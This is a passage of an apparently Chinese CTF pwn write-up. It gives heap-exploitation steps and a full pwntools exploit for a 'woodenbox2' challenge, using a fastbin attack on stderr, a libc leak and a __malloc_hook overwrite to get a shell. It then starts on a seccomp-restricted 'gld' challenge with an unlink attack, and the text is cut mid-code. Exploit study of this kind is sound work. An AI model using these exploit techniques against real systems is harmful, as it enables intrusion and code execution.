<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="堆布局-1"><a href="#堆布局-1" class="headerlink" title="堆布局"></a>堆布局</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c0 i0 用于堆溢出修改chunk 1为 unsorted bin</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c1 i1 用来进行fake chunk变成 unsoted bin 分割堆块到 chunk2</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c2 i2 用来进行fastbin attack 的chunk</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c3 i3 防止堆合并</span></span><br></pre></td></tr></table></figure>

<h4 id="打入IO-2-1-stderr"><a href="#打入IO-2-1-stderr" class="headerlink" title="打入IO_2_1_stderr"></a>打入IO_2_1_stderr</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">md(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0xe1</span>)) <span class="comment"># 修改chunk 1 为 unsoted bin</span></span><br><span class="line">rm(<span class="number">1</span>) <span class="comment"># 释放 chunk 1</span></span><br><span class="line">rm(<span class="number">1</span>) <span class="comment"># 释放 chunk 2 用于后面的fastbin attack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分割unsoted bin chunk 1堆块使 main_arena 信息跑到 chunk 2中</span></span><br><span class="line">ad(<span class="number">0x38</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">0x38</span>) <span class="comment"># c4 i3 in chunk 1</span></span><br><span class="line">ad(<span class="number">0x28</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">0x28</span>) <span class="comment"># c5 i4 in chunk 1</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 通过堆溢出修改chunk 2中的fd为 _IO_2_1_stderr_+157, 几率为 1/16</span></span><br><span class="line">md(<span class="number">2</span>, <span class="number">0x32</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x71</span>) + <span class="string">&#x27;\xdd\x25&#x27;</span>) <span class="comment"># c5</span></span><br><span class="line">   ad(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># for ajust</span></span><br></pre></td></tr></table></figure>

<h4 id="泄漏libc-1"><a href="#泄漏libc-1" class="headerlink" title="泄漏libc"></a>泄漏libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改_IO_2_1_stderr_结构体泄漏出地址</span></span><br><span class="line">   ad(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad3c80</span>) + <span class="number">3</span> * p64(<span class="number">0</span>) + p8(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">libc_base -= lib.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">192</span></span><br><span class="line">lib.address = libc_base</span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base)) </span><br><span class="line">__malloc_hook = lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = lib.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">li(<span class="string">&#x27;__malloc_hook &#x27;</span> + <span class="built_in">hex</span>(__malloc_hook)) </span><br><span class="line">gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<h4 id="打入malloc-hook"><a href="#打入malloc-hook" class="headerlink" title="打入malloc_hook"></a>打入malloc_hook</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="number">3</span>) <span class="comment">#释放掉 chunk 2</span></span><br><span class="line">   <span class="comment">#继续使用堆溢出修改chunk 2,再次采用fastbin attack 打入malloc_hook - 0x23处</span></span><br><span class="line">md(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>)) </span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#调整</span></span><br><span class="line">   <span class="comment">#修改realloc_hook为one_gadget, malloc_hook为realloc_hook调整rsp</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one_gadget) + p64(realloc))</span><br></pre></td></tr></table></figure>

<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#get shell</span></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;./woodenbox2&quot;</span></span><br><span class="line"><span class="comment">#libFile  = &quot;./libc.so.6&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;item:&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, size, text</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;item:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&#x27;name:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;item:&#x27;</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;item:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># notice: free() then idx forword 1</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c0 i0</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c1 i1</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c2 i2</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># c3 i3</span></span><br><span class="line"></span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0xe1</span>))</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	rm(<span class="number">1</span>) <span class="comment"># chunk 2</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#split chunk 1 as two, then main_arena to chunk 2</span></span><br><span class="line">	ad(<span class="number">0x38</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">0x38</span>) <span class="comment"># c4 i3 in chunk 1</span></span><br><span class="line">	ad(<span class="number">0x28</span>, <span class="string">&#x27;6&#x27;</span> * <span class="number">0x28</span>) <span class="comment"># c5 i4 in chunk 1</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># leaking</span></span><br><span class="line">	<span class="comment"># _IO_2_1_stderr_+157 for fastbin attack</span></span><br><span class="line">	md(<span class="number">2</span>, <span class="number">0x32</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x71</span>) + <span class="string">&#x27;\xdd\x25&#x27;</span>) <span class="comment"># c5</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># for ajust</span></span><br><span class="line">	<span class="comment">#                            0xfbad1800</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad3c80</span>) + <span class="number">3</span> * p64(<span class="number">0</span>) + p8(<span class="number">0</span>))</span><br><span class="line">	libc_base = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base -= lib.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">192</span></span><br><span class="line">	lib.address = libc_base</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(libc_base)) </span><br><span class="line">	__malloc_hook = lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	realloc = lib.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;__malloc_hook &#x27;</span> + <span class="built_in">hex</span>(__malloc_hook)) </span><br><span class="line">	gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	<span class="comment">#md(3, 4, &#x27;AAAA&#x27;)</span></span><br><span class="line">	rm(<span class="number">3</span>) <span class="comment">#rm chunk 2</span></span><br><span class="line">	md(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">&#x27;5&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one_gadget) + p64(realloc))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#get shell</span></span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>





<h2 id="gld"><a href="#gld" class="headerlink" title="gld"></a>gld</h2><h3 id="难度-2"><a href="#难度-2" class="headerlink" title="难度"></a>难度</h3><p>6 / 10</p>
<h3 id="保护-2"><a href="#保护-2" class="headerlink" title="保护"></a>保护</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    </span><br><span class="line"> logan@LYXF:~&#x2F;share&#x2F;lgd$ seccomp-tools dump .&#x2F;lgd</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x02 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<h3 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h3><p>有5个功能, 添加, 删除, 打印, 修改, 退出.没有开启EIP, 通过检查seccomp-tools检查, 开启了沙箱,不能get shell方式获取flag, 开了一个BCF(虚假控制流)</p>
<h3 id="vul-2"><a href="#vul-2" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_400896(dword_603010, dword_60303C + <span class="number">1</span>, dword_603040);</span><br><span class="line">  &#125;</span><br><span class="line">  size = <span class="built_in">snprintf</span>(byte_6033E0, size, <span class="string">&quot;%s&quot;</span>, &amp;unk_603060);<span class="comment">//vul: 通过字符长度来重新设置大小</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_60303C / dword_603010 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_60303C % dword_603010 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( dword_60303C % dword_603010 != dword_60303C / dword_603010 || dword_603040 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( dword_60303C % dword_603010 &lt;= <span class="number">1</span> || dword_60303C % dword_603010 &gt;= dword_60303C / dword_603010 )</span><br></pre></td></tr></table></figure>

<p>若输入的字符长度大于所输入的大小,造成堆溢出.</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>unsorted bin split, unlink attack, environ, seccomp, rop</p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过unsoted bin 分割堆块溢出libc基址, 使用unsoted bin taack 打入指针数组, 泄漏environ中的stack地址, 劫持修改功能的ret栈地址, 由于开了沙箱, 那就只能通过open, read, puts来获取方式来打印flag了.</p>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="堆布局-2"><a href="#堆布局-2" class="headerlink" title="堆布局"></a>堆布局</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name?&#x27;</span>, <span class="string">&#x27;I0gan&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x100</span>) <span class="comment"># idx 0 通过溢出修改chunk 1为 small bin</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment"># idx 1 为了分割unsoted bin,使 main_arena 到 chunk 2中</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment"># idx 2 为了打印 main_arena</span></span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment"># idx 3 不让top chunk 合并, 其实不用也行</span></span><br></pre></td></tr></table></figure>

<h4 id="获取libc"><a href="#获取libc" class="headerlink" title="获取libc"></a>获取libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0xe1</span>)</span><br><span class="line">md(<span class="number">0</span>, p) <span class="comment"># 修改 chunk 1为small bin然后释放</span></span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x78</span>) <span class="comment">#分割 chunk 1 (unsoted bin)使main_arena 跑到 chunk 2中</span></span><br><span class="line">dp(<span class="number">2</span>) <span class="comment"># 打印main_arena + 88处地址</span></span><br><span class="line">lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br></pre></td></tr></table></figure>

<h4 id="unsoted-bin-attack-掌控管理指针的数组"><a href="#unsoted-bin-attack-掌控管理指针的数组" class="headerlink" title="unsoted bin attack 掌控管理指针的数组"></a>unsoted bin attack 掌控管理指针的数组</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 恢复刚才所使用的small bin 为fast bin</span></span><br><span class="line">p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0x71</span>)</span><br><span class="line">md(<span class="number">0</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink attack to list</span></span><br><span class="line">ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment">#idx 4</span></span><br><span class="line"><span class="comment"># fake chunk</span></span><br><span class="line">plist = <span class="number">0x6032f8</span> <span class="comment"># 管理当前chunk的地址</span></span><br><span class="line">p = p64(<span class="number">0</span>) <span class="comment"># prev_size</span></span><br><span class="line">p += p64(<span class="number">0x61</span>) <span class="comment"># size</span></span><br><span class="line">p += p64(plist - <span class="number">0x18</span>) <span class="comment"># fd</span></span><br><span class="line">p += p64(plist - <span class="number">0x10</span>) <span class="comment"># bk</span></span><br><span class="line">p += p64(<span class="number">0x60</span>) <span class="comment"># next_size</span></span><br><span class="line">p = p.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>) </span><br><span class="line">p += p64(<span class="number">0x60</span>) <span class="comment"># 